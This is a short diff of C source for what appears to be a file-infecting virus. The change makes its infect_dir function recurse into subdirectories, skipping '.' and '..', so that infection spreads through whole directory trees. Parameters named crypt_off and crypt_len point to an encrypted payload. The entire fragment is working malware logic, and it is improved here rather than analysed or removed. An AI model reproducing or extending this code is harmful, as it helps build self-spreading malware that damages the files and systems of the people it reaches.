@@ -165,9 +165,11 @@ int infect_dir(char *dirname, char *b, size_t bn, size_t crypt_off, size_t crypt
 	size_t x = 0;
 	while (x < size){
 		d = (struct linux_dirent*)(p + x);
-		if (opt.do_recur && d_isdir(d)){
+		if (opt.do_recur && !str_equal(d->d_name, ".") && !str_equal(d->d_name, "..") &&  d_isdir(d)){
+			add_base((char *)tmp, dirname, d->d_name, LIM);
 			//print("     d:");println(tmp);
 			//println("dir and can recur!");
+			infect_dir((char*)tmp, b,bn,crypt_off,crypt_len,opt);
 		}
 		else if (d_isfile(d)){
 			add_base((char *)tmp, dirname, d->d_name, LIM);
